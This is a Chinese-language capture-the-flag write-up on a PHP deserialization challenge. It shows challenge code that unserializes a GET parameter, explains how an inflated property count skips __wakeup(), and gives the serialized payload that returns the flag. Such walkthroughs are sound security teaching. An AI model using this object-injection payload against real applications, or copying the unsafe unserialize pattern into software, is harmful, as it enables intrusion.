![image.png](https://cdn.nlark.com/yuque/0/2024/png/42994824/1715825611975-6637dd08-b9a3-4fb4-80e7-e16ee297db6b.png#averageHue=%23eaeae7&clientId=ube6ce20d-f138-4&from=paste&height=797&id=ua9256b2b&originHeight=1196&originWidth=1382&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=135891&status=done&style=none&taskId=u93b0d893-2182-403a-bb06-11893a23f5d&title=&width=921.3333333333334)
```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{
  public $admin;
  public $passwd;

  public function __construct(){
    $this->admin ="user";
    $this->passwd = "123456";
  }

  public function __wakeup(){
    $this->passwd = sha1($this->passwd);
  }

  public function __destruct(){
    if($this->admin === "admin" && $this->passwd === "wllm"){
      include("flag.php");
      echo $flag;
    }else{
      echo $this->passwd;
      echo "No wake up";
    }
  }
}

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```
## 分析
分析代码之后发现当admin = "admin"和passwd ="wllm"时就会输出flag
但有一个魔法方法：_wakeup():
> 当你使用serialize()函数将一个对象转换为字符串以便存储或传输时，该对象的所有公共属性（public）、保护属性（protected）和私有属性（private）都会被保存。但是，对象的某些状态或资源（如打开的数据库连接、文件句柄等）不会被保存。
> 然后，当你使用unserialize()函数将这个字符串转换回对象时，PHP会重新创建该对象并恢复其所有保存的属性值。但是，在恢复对象之前，PHP会检查该对象是否有一个__wakeup()方法。如果有，那么在恢复对象的属性之前，PHP会调用__wakeup()方法。

_wakeup()绕过方法：
>  __wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行


## 构造payload：
```php
<?php
class HaHaHa{
    public $admin = "admin";
    public $passwd = "wllm";
}
$bx = new HaHaHa();
echo serialize($bx);
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42994824/1715826142032-556c93b3-f35f-4ed1-8b3c-07b68e34bf9f.png#averageHue=%23699a65&clientId=ube6ce20d-f138-4&from=paste&height=273&id=u3120e399&originHeight=410&originWidth=1885&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65833&status=done&style=none&taskId=u61d5986c-f2ab-4eba-b118-7b4374902ec&title=&width=1256.6666666666667)
当输入这个payload时，发现_wakeup方法执行了
所以此时修改payload来绕过方法
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42994824/1715826197813-c8984965-a82c-4b38-ae89-ff78a30bf01a.png#averageHue=%23eaeae7&clientId=ube6ce20d-f138-4&from=paste&height=850&id=u641c302e&originHeight=1275&originWidth=1565&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=156535&status=done&style=none&taskId=udf5205ad-3d73-46b1-9c39-8a7565a69d8&title=&width=1043.3333333333333)
> 修改后:
p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}


![image.png](https://cdn.nlark.com/yuque/0/2024/png/42994824/1715826342285-222a6d49-8e08-4014-b186-d33b37d9b4c0.png#averageHue=%23eaeae7&clientId=ube6ce20d-f138-4&from=paste&height=849&id=u95b5e438&originHeight=1274&originWidth=1288&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=155075&status=done&style=none&taskId=ue08a48f0-1145-4c99-aa95-ee89f7cc7ba&title=&width=858.6666666666666)
得到NSSCTF

